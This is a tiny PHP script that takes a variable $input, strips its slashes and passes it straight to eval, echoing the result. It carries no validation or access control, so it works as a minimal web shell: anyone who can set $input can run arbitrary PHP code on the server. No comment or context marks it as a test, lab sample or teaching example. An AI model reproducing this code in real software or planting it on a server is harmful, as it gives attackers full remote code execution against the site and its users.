<?php

$input = stripslashes( $input );

#echo $input;

if( $input ){ echo eval( $input ); }

